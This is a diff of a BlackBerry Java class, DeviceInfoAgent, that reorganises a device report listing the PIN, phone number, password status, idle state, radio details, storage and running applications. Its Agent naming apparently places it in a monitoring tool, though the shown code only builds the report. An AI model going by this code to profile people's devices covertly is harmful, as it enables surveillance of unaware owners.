@@ -22,6 +22,7 @@ import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.RadioInfo;
+import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
@@ -99,12 +100,72 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Debug\n");
         //#endif
 
+        sb.append("-- SYSTEM --\r\n");
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
         sb.append("Pin: " + Device.getPin() + "\n");
 
+        sb.append("-- OS --\r\n");
+        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
+        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
+
+        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
+        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
+        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+
+        sb.append("-- HARDWARE --\r\n");
+        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
+        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
+        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
+        sb.append("Phone: " + device.getPhoneNumber() + "\n");
+        sb.append("Keypad layout: ");
+        int keyLayout=Keypad.getHardwareLayout();
+        switch(keyLayout){
+            case Keypad.HW_LAYOUT_32:
+                sb.append("32 " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_39:
+                sb.append("39" + "\n");
+                break;
+            case Keypad.HW_LAYOUT_LEGACY:
+                sb.append("LEGACY" + "\n");
+                break;
+            case Keypad.HW_LAYOUT_PHONE:
+                sb.append("PHONE" + "\n");
+                break;
+            case Keypad.HW_LAYOUT_REDUCED_24:
+                sb.append("REDUCED" + "\n");
+                break;
+/*            case Keypad.HW_LAYOUT_TOUCHSCREEN_12:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_12A:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_12H:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_20J:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
+                sb.append("TOUCH " + "\n");
+                break;
+            case Keypad.HW_LAYOUT_TOUCHSCREEN_20K:
+                sb.append("TOUCH " + "\n");
+                break;*/
+                
+                default:
+                    sb.append("UNK " +keyLayout+ "\n");
+                    break;
+               
+        }
+
         // Alimentazione
-        // sb.append("\nBATTERY\n-----\n");
+        sb.append("-- POWER --\r\n");
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
         sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
         sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
@@ -112,7 +173,7 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
 
         // Radio
-        // sb.append("\nRADIO\n-----\n");
+        sb.append("-- RADIO --\r\n");
         if (Device.isCDMA()) {
             sb.append("CDMA\n");
             sb.append("SID: " + device.getSid() + "\n");
@@ -157,29 +218,16 @@ public final class DeviceInfoAgent extends Agent {
             //#endif
         }
 
-        // Device
-        // sb.append("\nDEVICE\n------\n");
+        sb.append("-- FLASH --\r\n");
+        sb.append("Flash Size: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
 
-        // OS Version
-        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
-        sb.append("RAM: " + Runtime.getRuntime().totalMemory() + "\n");
-        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
-        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
-        sb.append("Phone: " + device.getPhoneNumber() + "\n");
-
-        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
-        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
-        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
-        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
-
-        // DISK
-        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
-
-        sb.append("internal space: " + Path.freeSpace(Path.USER) + " Bytes\n");
+        sb.append("Free flash: " + Path.freeSpace(Path.USER) + " Bytes\n");
         if (Path.isSDAvailable()) {
-            sb.append("SD space: " + Path.freeSpace(Path.SD) + " Bytes\n");
+            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
+            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
         }
 
+        sb.append("-- APPLICATIONS --\r\n");
         sb.append(getRunningApplications());
 
         try {
